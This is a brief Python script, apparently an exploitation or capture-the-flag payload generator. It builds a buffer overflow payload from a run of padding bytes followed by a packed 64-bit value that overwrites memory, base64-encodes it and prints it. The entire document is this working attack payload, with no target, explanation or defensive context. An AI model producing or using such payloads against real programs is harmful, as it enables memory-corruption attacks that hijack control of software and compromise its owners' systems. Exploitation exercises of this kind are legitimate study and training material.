
import sys
import struct
import base64

buf = b'ppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp'
buf += struct.pack('<Q', 6147152756870460789)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
